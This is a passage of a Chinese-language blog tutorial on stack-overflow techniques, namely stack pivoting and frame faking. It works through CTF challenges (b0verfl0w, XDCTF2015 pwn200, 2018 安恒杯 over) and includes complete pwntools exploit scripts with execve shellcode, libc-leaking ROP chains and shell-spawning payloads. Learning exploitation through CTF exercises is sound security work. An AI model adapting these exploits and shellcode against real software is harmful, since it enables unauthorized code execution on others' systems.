+<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>给出自己想出来的第一种构造方法，比wiki中方法短一点，可以缩短到溢出空间为4个字节，但是也是巧合吧，找到了0x08048500这个gadget。先改变esp的值，然后再jmp esp，如下图所示：<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>当程序执行ret指令后，就会使eip指向sub esp,0x24时，此时esp指向0x28；当程序执行完sub esp,0x24指令（为���么不是0x28呢？因为这里只在b0verfl0w找到了sub esp,0x24）后，就会使esp指向0x04位置，也就是存储0x08048504的单元。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>再次执行ret指令后，使得eip指向jmp esp，此时esp指向shellcode（本题中没有nx保护）；执行执行完jmp esp指令后，eip指向了shellcode，这样shellcode就被触发了。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"> </p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>来看第二种方法：这是wiki中给出的构造方法，如下：程序执行完ret指令后，eip会指向jmp esp，此时esp指向0x28。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>执行完黄色的jmp esp后，eip指向了0x28。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>程序执行完sub esp,0x28指令后，esp指向0x0。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>此时程序会继续执行蓝色的jmp esp指令，然后eip就会指向0x0��接下来会执行payload。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>ps：可以发现我们实际上构造的payload是什么？我当时不明白为什么要使用jmp esp的gadget。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>这个就是应该执行的payload，执行control esp部分，那么一切就变的很完美掌控。但是确无法直接实现，因为指令被写入了栈里面（写入sub esp,0x28指令，前提是没有开启nx），需要eip去指向这个地址，才可以顺利执行，通过jmp esp的gadget即可达到这个效果，如下：<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>这样就可以，因为执行0x08048504时，esp指向0x28，那么jmp esp后shellcode就会完美执行。 </p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><h5 id="exp一"><a href="#exp一" class="headerlink" title="exp一"></a>exp一</h5><pre><code class="java">  exp（一）：
+from pwn <span class="keyword">import</span> *
+sh = process(<span class="string">'./b0verfl0w'</span>)
+# context.arch = 'i386'
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]
+shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
+shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
+shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span>
+
+sub_esp_jmp = asm(<span class="string">'sub esp, 0x24;jmp esp'</span>)
+jmp_esp = <span class="number">0x08048504</span>
+sub_esp = <span class="number">0x08048500</span>
+payload = <span class="string">'bbbb'</span> + p32(jmp_esp) + shellcode_x86 + (
+    <span class="number">0x20</span> - len(shellcode_x86) - <span class="number">8</span>) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> + p32(sub_esp)
+
+sh.sendline(payload)
+# gdb.attach(sh)
+sh.interactive()
+
+</code></pre>
+<p><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"> </p>
+<h5 id="exp二"><a href="#exp二" class="headerlink" title="exp二"></a>exp二</h5><pre><code class="java">  from pwn <span class="keyword">import</span> *
+sh = process(<span class="string">'./b0verfl0w'</span>)
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]
+shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span>
+shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span>
+shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span>
+
+sub_esp_jmp = asm(<span class="string">'sub esp, 0x28;jmp esp'</span>)
+jmp_esp = <span class="number">0x08048504</span>
+payload = shellcode_x86 + (
+    <span class="number">0x20</span> - len(shellcode_x86)) * <span class="string">'b'</span> + <span class="string">'bbbb'</span> + p32(jmp_esp) + sub_esp_jmp
+
+sh.sendline(payload)
+# gdb.attach(sh)
+sh.interactive()
+
+</code></pre>
+<p><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>最后推荐一个工具<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"> </p>
+<h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h3><p>顾名思义，frame faking就是另外起一个虚假的栈帧来控制程序的执行流，与栈迁移有异曲同工之处。为什么要这样呢？由于原来溢出空间大小不足以承载payload，解决溢出空间不足的问题。比如： </p>
+<pre><code class="java">  <span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>{
+    <span class="keyword">char</span> buf[<span class="number">80</span>];
+    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">100</span>);
+}
+
+</code></pre>
+<p>上面这个例子的溢出空间是0x14，不足以承载我们构造的payload，既然空间不足，我们就创造一个空间足够大的新的栈空间。或者如2018 安恒杯 over一样，溢出空间只够覆盖rbp和ret_addr，很极限的操作。后面的介绍中将会引出两种构造方式，一种是边读边迁，一种是读完再迁，根据不同的场景进行构造，多样地去理解这一方法。 </p>
+<h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>第一种构造方式：边读边迁，然后以XDCTF2015的pwn200为例子进行实践，抛弃原来的正常的解法。虽然利用这种方法显得没必要，多此一举了，但是可以增加理解。首先明确这是一个递进的过程。怎么识别我们构造的栈是一个新的栈空间呢？那就需要ESP和EBP来配合，EBP和ESP之间的内存单元就是程序可识别的栈空间。那么怎么让ESP和ESP去指向新的栈空间呢？基于栈溢出，我们能够知道，在栈溢出中，影响到的寄存器中有EBP，ESP，那么我们就可以通过构造payload来实现ESP和ESP的值。其实这个本质在于怎么去控制ESP，我们可以使用控制EBP来协助，因为leave;ret指令可以使用EBP来间接控制ESP。<br>那么怎么去执行payload呢？通过rop控制eip寄存器的值。可以发现，无论我们怎么做，最基本的就是控制EBP（栈）和控制EIP（执行流）。关键指令：<br>一、第一次调用leave指令，为了形成fake_ebp，这是原由代码段自带的部分，正常的程序执行流，leave也就是move esp, ebp; pop ebp，这就可以改变EBP的值为fake_ebp，完成第一步的迁移操作。<br>二、第二次调用leave指令，在栈中构造的gadget中的leave，leave=&gt;move esp, ebp; pop ebp，通过ebp的值来改变esp的值，使得esp的值也是fake_ebp，完成第二步的迁移操作，至此，栈迁移工作完成。<br>三、第二次调用leave指令后，需要再调用ret指令，控制程序的执行流，从而执行新栈上的payload。边读边迁，顾名思义，两个过程是一块进行的，先控制ebp确定fake_ebp，然后在fake_ebp中写入payload，最后控制esp和eip执行payload。下面我们看一下具体的利用过程：<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>执行move esp, ebp，使得esp指向1处，然后执行pop ebp;此时ebp寄存器就会执行fake_ebp<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>执行ret时，eip执行read函数，此时就会执行read函数，我们传入一个fake_ebp_2的十六进制（这个是作为栈底地址），此时在fake_ebp地址处（ESP指向地址）的值为fake_ebp_2。<br>read函数执行返回后执行leave_ret命令，这里可以分为三个命令来执行。3-1时，EBP和ESP都指向了fake_ebp的位置<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>3-2时，EBP指向了fake_ebp_2，这里就是栈底了，ESP指向下一个内存单元，也就是ret_addr处3-3时，ESP继续指向下一个内存单元，EIP的值就是ret_addr的值。此时栈迁移就完毕了，我们就可以在一个新的栈里面构造payload了，通过上述可以发现，我们可以3-3的部分入手进行利用，通过2处的read函数写入满足条件的payload就可以执行命令。看完这三幅图，再结合一开始的描述，此过程的操作理解起来就简单了。 </p>
+<h4 id="应用一"><a href="#应用一" class="headerlink" title="应用一"></a>应用一</h4><p>程序中sub_8048484()函数存在栈溢出漏洞： </p>
+<pre><code class="java">  sub_8048484()
+{
+  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span>
+  setbuf(stdin, &amp;buf);
+  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);
+}
+
+</code></pre>
+<p>可以看到明显的栈溢出，虽然溢出的操作空间挺大的，我们依然尝试迁移栈的办法，根据上面的分析构造第一次发送的payload： </p>
+<pre><code class="java">  -----------------------
+aaaa....                         ｜padding
+-----------------------
+<span class="number">0x804a820</span>                 ｜fake_ebp
+-----------------------
+read<span class="meta">@plt</span>_addr            ｜ret_addr
+-----------------------
+<span class="number">0x8048481</span>                 ｜leave_ret
+-----------------------
+<span class="number">0x0</span>                              ｜fd
+-----------------------
+<span class="number">0x804a820</span>                 ｜buf
+-----------------------
+<span class="number">0x64</span>                            ｜nbytes
+-----------------------                               
+
+</code></pre>
+<p><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>第二次发送的payload </p>
+<pre><code class="java">  -----------------------
+<span class="number">0x804a820</span>                ｜padding
+-----------------------
+write<span class="meta">@plt</span>_addr          ｜ret_addr
+-----------------------
+<span class="number">0x8048369</span>                ｜控制执行流
+-----------------------
+<span class="number">0x1</span>                              ｜fd
+-----------------------
+read<span class="meta">@got</span>.plt               ｜buf
+-----------------------
+<span class="number">0x4</span>                             ｜nbytes
+-----------------------  
+write<span class="meta">@plt</span>_addr          ｜ret_addr
+-----------------------
+<span class="number">0x8048369</span>                ｜控制执行流
+-----------------------
+<span class="number">0x0</span>                               ｜fd
+-----------------------
+<span class="number">0x804a84c</span>                ｜buf
+-----------------------
+<span class="number">0x100</span>                          ｜nbytes
+-----------------------      
+ ........                           ｜<span class="number">0x804a84c</span>
+-----------------------   
+
+</code></pre>
+<p><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>第三次发送的payload </p>
+<pre><code class="java">  -----------------------      
+system_addr              ｜<span class="number">0x804a84c</span>
+-----------------------        
+bbbb                           ｜<span class="number">0x804a850</span>
+-----------------------      
+ /bin/sh_addr              ｜<span class="number">0x804a854</span>
+-----------------------     
+
+</code></pre>
+<p><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>exp： </p>
+<pre><code class="java">  from pwn <span class="keyword">import</span> *
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]
+elf = ELF(<span class="string">'bed0c68697f74e649f3e1c64ff7838b8'</span>)
+r = process(<span class="string">'./bed0c68697f74e649f3e1c64ff7838b8'</span>)
+rop = ROP(<span class="string">'./bed0c68697f74e649f3e1c64ff7838b8'</span>)
+
+offset = 108 ## find stack overflow length
+bss_addr = elf.bss()
+leave_ret = 0x08048481 ## ROPgadget --binary bed0c68697f74e649f3e1c64ff7838b8  --only 'leave|ret'
+read_plt = elf.plt[<span class="string">'read'</span>]
+read_got = elf.got[<span class="string">'read'</span>]
+libc = ELF(<span class="string">'/usr/lib/i386-linux-gnu/libc-2.24.so'</span>)
+read_libc = libc.symbols[<span class="string">'read'</span>]
+system_libc = libc.symbols[<span class="string">'system'</span>]
+
+r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)
+# gdb.attach(r)
+## stack pivoting to bss segment
+## new stack size is 0x800
+stack_size = <span class="number">0x800</span>
+base_stage = bss_addr + stack_size
+## padding 108 
+rop.raw(<span class="string">'a'</span> * offset)
+## faker_ebp1
+rop.raw(base_stage)
+### stack pivoting, set esp = base_stage
+rop.raw(flat(read_plt,leave_ret,<span class="number">0</span>, base_stage, <span class="number">100</span>))
+# print rop.dump()
+r.sendline(rop.chain())
+
+## getshell
+rop = ROP(<span class="string">'./bed0c68697f74e649f3e1c64ff7838b8'</span>)
+rop.raw(base_stage)
+rop.write(<span class="number">1</span>, read_got, <span class="number">0x4</span>)
+rop.read(<span class="number">0</span>,base_stage+<span class="number">0x2c</span>,<span class="number">0x100</span>)
+rop.raw(<span class="string">'a'</span> * ( <span class="number">50</span> - len(rop.chain())))
+print rop.dump()
+gdb.attach(r)
+r.sendline(rop.chain())
+
+libc.address = u32(r.recv(<span class="number">4</span>)) - read_libc
+payload = flat([libc.sym[<span class="string">'system'</span>],<span class="string">'bbbb'</span>,next(libc.search(<span class="string">'/bin/sh'</span>))])
+r.sendline(payload)
+r.interactive()
+
+</code></pre>
+<p>ps:小知识点：使用sendline习惯了，read函数先读缓冲区预留的内容，再读输入的内容，自己构造的时候调式了好久，还是太菜，当时一直以为这是玄学问题。<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"> </p>
+<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>第二种构造方式：读完再迁，依然以XDCTF2015的pwn200为例子进行实践。依然是需要构造一个新的也就是栈迁移，这其中包括：leave形成新栈、read函数在新的栈中读入内容、需要一个ret来控制rip进行执行。那么读完再迁就是说先把payload读完，然后再把ebp和esp一块确定到payload所在的位置。因此可以这样构造： </p>
+<pre><code class="java">  -----------------------
+aaaa....                         ｜padding
+-----------------------
+aaaa                             ｜ebp
+-----------------------
+read<span class="meta">@plt</span>_addr            ｜ret_addr
+-----------------------
+<span class="number">0x8048369</span>                 ｜控制执行流
+-----------------------
+<span class="number">0x0</span>                              ｜fd
+-----------------------
+fake_ebp .                   ｜buf
+-----------------------
+<span class="number">0x64</span>                            ｜nbytes
+-----------------------    
+pop ebp_ ret               ｜控制执行流
+-----------------------    
+fake_ebp                     ｜fake_ebp
+-----------------------    
+<span class="number">0x8048481</span>                 ｜leave_ret
+-----------------------          
+
+</code></pre>
+<p>我们看一下具体的操作：<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"> </p>
+<h4 id="应用二"><a href="#应用二" class="headerlink" title="应用二"></a>应用二</h4><p>其他内容同应用一，具体看一下这几次payload不同的地方：<br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br><img src="https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" alt="Test" title="栈溢出技巧（上）"><br>首先是第一次，先执行完read完payload后，再次leave;ret进行迁移执行，期间由于有出栈的动作，所以得注意地址的填写，注意图一和图二中蓝色框框的地址部分即可。exp： </p>
+<pre><code class="java">  from pwn <span class="keyword">import</span> *
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]
+elf = ELF(<span class="string">'bed0c68697f74e649f3e1c64ff7838b8'</span>)
+r = process(<span class="string">'./bed0c68697f74e649f3e1c64ff7838b8'</span>)
+rop = ROP(<span class="string">'./bed0c68697f74e649f3e1c64ff7838b8'</span>)
+
+offset = <span class="number">112</span>
+bss_addr = elf.bss()
+leave_ret = <span class="number">0x08048481</span>
+read_plt = elf.plt[<span class="string">'read'</span>]
+read_got = elf.got[<span class="string">'read'</span>]
+libc = ELF(<span class="string">'/usr/lib/i386-linux-gnu/libc-2.24.so'</span>)
+read_libc = libc.symbols[<span class="string">'read'</span>]
+system_libc = libc.symbols[<span class="string">'system'</span>]
+
+r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)
+stack_size = <span class="number">0x800</span>
+base_stage = bss_addr + stack_size
+### padding
+rop.raw(<span class="string">'a'</span> * offset)
+### read 100 byte to base_stage
+rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)
+### stack pivoting, set esp = base_stage
+rop.migrate(base_stage)
+print rop.dump()
+r.sendline(rop.chain())
+
+## getshell
+rop = ROP(<span class="string">'./bed0c68697f74e649f3e1c64ff7838b8'</span>)
+rop.write(<span class="number">1</span>, read_got, <span class="number">0x4</span>)
+rop.read(<span class="number">0</span>,base_stage+<span class="number">0x28</span>,<span class="number">0x100</span>)
+rop.raw(<span class="string">'a'</span> * ( <span class="number">50</span> - len(rop.chain())))
+print rop.dump()
+gdb.attach(r)
+r.sendline(rop.chain())
+
+libc.address = u32(r.recv(<span class="number">4</span>)) - read_libc
+payload = flat([libc.sym[<span class="string">'system'</span>],<span class="string">'bbbb'</span>,next(libc.search(<span class="string">'/bin/sh'</span>))])
+r.sendline(payload)
+r.interactive()
+
+</code></pre>
+<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>以2018年安恒杯中over题目为例子： </p>
+<pre><code class="java">  <span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>
+<span class="function"></span>{
+  setvbuf(stdin, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);
+  setvbuf(stdout, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);
+  <span class="keyword">while</span> ( sub_400676() )
+    ;
+  <span class="keyword">return</span> <span class="number">0L</span>L;
+}
+<span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span>
+  memset(&amp;buf, <span class="number">0</span>, <span class="number">0x50</span>uLL);
+  putchar(<span class="number">62</span>);
+  read(<span class="number">0</span>, &amp;buf, <span class="number">0x60</span>uLL);
+  <span class="keyword">return</span> puts(&amp;buf);
+}
+
+</code></pre>
+<p>存在栈溢出，但是payload空间不足，只能覆盖到ret_addr的内存单元。那么我们需要构造一个新栈（思路二），因为程序中存在循环读，刚好可以简化思路二，以至达到极限的空间大小。payload如下：p64(0)*n #padding fake rbp # 此时执行到这，代码段中会执行leave指令，控制rbp寄存器。leave_ret_addr # 因为我想控制rip寄存器，控制rsp寄存器，通过leave;ret控制rip寄存器。思路准备：一、文件为ELF 64-bit LSB executable，最后选择使用execve函数进行getshell（system(“/bin/sh”) 可能会因为 env 被破坏而失效），那么就需要确定三个寄存器 rdi,rsi,rdx的���数值。二、因为ASLR无法获取具体地址，需要泄漏libc的基址。三、找到一中需要的gadgets：0x00000000000f52b9 : pop rdx ; pop rsi ; ret、0x000000000001fc6a : pop rdi ; ret、0x0000000000001b92 : pop rdx ; ret等等可以使用的。<br>步骤分析：我们需要泄漏libc的基址，然后计算出execve地址，于是构造如下payload进行getshell。 </p>
+<pre><code class="java">  -----------------------
+pop_rdi_ret                 ｜rdi = /bin/sh_addr
+-----------------------
+/bin/sh_addr               ｜
+-----------------------
+pop_rdx_pop_rsi_ret ｜rdx = <span class="number">0</span> rsi = <span class="number">0</span>
+-----------------------
+p64(<span class="number">0</span>)                         ｜
+-----------------------
+p64(<span class="number">0</span>)                         ｜
+-----------------------
+execve_addr               ｜rip = execve_addr
+-----------------------
+
+</code></pre>
+<p>那么问题来了，我们怎么样把这几步都串起来？首先是找一个base_addr作为新的栈，此题目和思路二中有区别就是无法去构造read函数对新栈写payload了，使用程序中的read函数去写payload，也就是说fake frame或者新栈的位置已经确定了，那就是read函数的buf参数，也就是rbp-0x50的栈上的地址。因此我们后面的构造的payload都需要围绕此处地址就行展开，因此这里就会多一步：获取fake_rbp地址。第一步：获取fake_rbp地址根据read函数的特性，read完后并不会给输入末尾补上’\0’，和程序中的代码段：read(0, &amp;buf, 0x60uLL);return puts(&amp;buf);因此rbp 的值就会被 puts 打印出来。第一次发送为发送 0x50个非’\x00’字节，把buf和rbp之前的可能有的0x00覆盖掉，这样就可以puts出rbp的值，从收到数据提取出fake_rbp的地址即可。<br>第二步：泄漏libc的基址这一步类似于思路二的第一步和二步结合，但是构造泄漏libc的基址payload： </p>
+<pre><code class="java">  -----------------------
+aaaaaaaa                     ｜buf_addr
+-----------------------
+pop_rdi_ret                 ｜rdi = puts<span class="meta">@got</span>_addr
+-----------------------
+puts<span class="meta">@got</span>_addr           ｜
+-----------------------
+puts<span class="meta">@plt</span>_addr            ｜puts(puts<span class="meta">@got</span>_addr)
+-----------------------
+<span class="function">call <span class="title">sub_400676</span><span class="params">()</span>       | 循环读入开始（这样payload中就不需要构造read函数了）</span>
+<span class="function">-----------------------</span>
+<span class="function">aaaaa.....                      ｜padding</span>
+<span class="function">-----------------------  </span>
+<span class="function"> buf_addr                    ｜fake_rbp</span>
+<span class="function">-----------------------</span>
+<span class="function">0x4006be                    ｜leave_ret</span>
+<span class="function">-----------------------</span>
+<span class="function"></span>
+</code></pre>
+<p>这里需要注意pop_rdi_ret是在over.over中找的，因为没有libc的基址情况下，无法使用libc中内容。执行完此payload后，减去libc.sym[‘puts’]就是libc的地址，然后获取execve的地址和”bin/sh”字符串的地址。另外这与思路二的差别依然是read函数的，调用sub_400676()不能控制buf的地址，得围绕buf地址就行展开构造。<br>第三步：执行execve函数进行getshell因为无法控制read函数的buf地址，需要与上一步一样构造控制程序的执行流。payload如下， </p>
+<pre><code class="java">  -----------------------
+aaaaaaaa                     ｜buf_addr-<span class="number">0x30</span>
+-----------------------
+pop_rdi_ret                 ｜rdi = /bin/sh_addr
+-----------------------
+/bin/sh_addr               ｜
+-----------------------
+pop_rdx_pop_rsi_ret ｜rdx = <span class="number">0</span> rsi = <span class="number">0</span>
+-----------------------
+p64(<span class="number">0</span>)                         ｜
+-----------------------
+p64(<span class="number">0</span>)                         ｜
+-----------------------
+execve_addr               ｜rip = execve_addr
+-----------------------
+aaaaa.....                      ｜padding
+-----------------------  
+ buf_addr-<span class="number">0x30</span>          ｜fake_rbp
+-----------------------
+<span class="number">0x4006be</span>                    ｜leave_ret
+-----------------------
+
+</code></pre>
+<p>exp： </p>
+<pre><code class="java">  from pwn <span class="keyword">import</span> *
+context.binary = <span class="string">"./over.over"</span>
+context.arch = <span class="string">'amd64'</span>
+context.log_level = <span class="string">'debug'</span>
+context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]
+
+sh = process(<span class="string">"./over.over"</span>)
+elf = ELF(<span class="string">"./over.over"</span>)
+libc = elf.libc
+
+sh.sendafter(<span class="string">"&gt;"</span>, <span class="string">'a'</span> * <span class="number">80</span>)
+stack = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - <span class="number">0x70</span>
+
+sh.sendafter(<span class="string">"&gt;"</span>, flat([<span class="string">'aaaaaaaa'</span>, <span class="number">0x400793</span>, elf.got[<span class="string">'puts'</span>], elf.plt[<span class="string">'puts'</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">'a'</span>, stack, <span class="number">0x4006be</span>]))
+libc.address = u64(sh.recvuntil(<span class="string">"\x7f"</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - libc.sym[<span class="string">'puts'</span>]
+pop_rdi_ret=<span class="number">0x400793</span>
+# gdb.attach(sh)
+pop_rdx_pop_rsi_ret=libc.address+<span class="number">0x00000000000f52b9</span>
+payload=flat([<span class="string">'aaaaaaaa'</span>, pop_rdi_ret, next(libc.search(<span class="string">"/bin/sh"</span>)),pop_rdx_pop_rsi_ret,p64(<span class="number">0</span>),p64(<span class="number">0</span>), libc.sym[<span class="string">'execve'</span>], (<span class="number">80</span> - <span class="number">7</span>*<span class="number">8</span> ) * <span class="string">'a'</span>, stack - <span class="number">0x30</span>, <span class="number">0x4006be</span>])
+sh.sendafter(<span class="string">"&gt;"</span>, payload)
+sh.interactive()
+
+</code></pre>
+
+            <div class="post-copyright">
+    <div class="content">
+        
+          <p>本文标题： 推荐系列-栈溢出技巧（上）</p>
+        
+        
+          <p>本文作者： OSChina</p>
+        
+        <p>发布时间： 2021年04月15日 10:04</p>
+        <p>最后更新： 2021年07月23日 23:43</p>
+        <p>原始链接： <a class="post-url" href="/16433f9b/" title="推荐系列-栈溢出技巧（上）">https://www.hosiang.cn/16433f9b/</a></p>
+        <p>版权声明： 本文著作权归作者所有，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank">CC BY-NC-SA 4.0</a>许可协议，转载请注明出处！</p>
+        <footer>
+            <a href="https://www.hosiang.cn">
+                <img src="/../images/logo.png" alt="Howe Hsiang">
+                Howe Hsiang
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;">赏</a>
+</div>
+
+<div id="reward" class="post-modal reward-lay">
+    <a class="close" href="javascript:;" id="reward-close">×</a>
+    <span class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        喜欢就赞赏一下呗！
+        <i class="icon icon-quote-right"></i>
+    </span>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/images/threepay_code.jpg" alt="打赏二维码">
+        </div>
+        <div class="reward-select">
+            
+            
+        </div>
+    </div>
+</div>
+
+
+        
+    </div>
+
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt" style="padding-top: 11px !important;"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.hosiang.cn/16433f9b/" data-title="Facebook" rel="external nofollow noopener noreferrer">
+              <i class="fa fa-facebook" style="padding-top: 9px !important;"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《推荐系列-栈溢出技巧（上）》 — 狂欢马克思&url=https://www.hosiang.cn/16433f9b/&via=https://www.hosiang.cn" data-title="Twitter" rel="external nofollow noopener noreferrer">
+              <i class="fa fa-twitter" style="padding-top: 9px !important;"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.hosiang.cn/16433f9b/" data-title="Google+" rel="external nofollow noopener noreferrer">
+              <i class="fa fa-google-plus" style="padding-top: 9px !important;"></i>
+            </a>
+          </li>
+            <li>
+                <a class="qq share-sns" target="_blank" href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.hosiang.cn/16433f9b/&title=《推荐系列-栈溢出技巧（上）》 — 狂欢马克思&source=&emsp;&emsp;ASLR和PIE 我们都知道由于受到堆栈和libc地址可预测的困扰，ASLR被设计出来并得到广泛应用，后来各种绕过技术出现，比如r..." data-title="QQ" rel="external nofollow noopener noreferrer">
+                    <i class="fa fa-qq" style="padding-top: 9px !important;"></i>
+                </a>
+            </li>
+            <li>
+                <a class="weixin share-sns" id="wxFab" href="javascript:" data-title="微信">
+                    <i class="fa fa-weixin" style="padding-top: 9px !important;"></i>
+                </a>
+            </li>
+            <li>
+                <a class="weibo share-sns" target="_blank" href="https://service.weibo.com/share/share.php?url=https://www.hosiang.cn/16433f9b/&title=《推荐系列-栈溢出技巧（上）》 — 狂欢马克思&pic=https://www.hetianlab.com/specialized/headImg.action?news=f8bd1770-0ee1-4cd8-9da2-d7d0ce1d0c7a.png" data-title="微博" rel="external nofollow noopener noreferrer">
+                    <i class="fa fa-weibo" style="padding-top: 9px !important;"></i>
+                </a>
+            </li>
+        </ul>
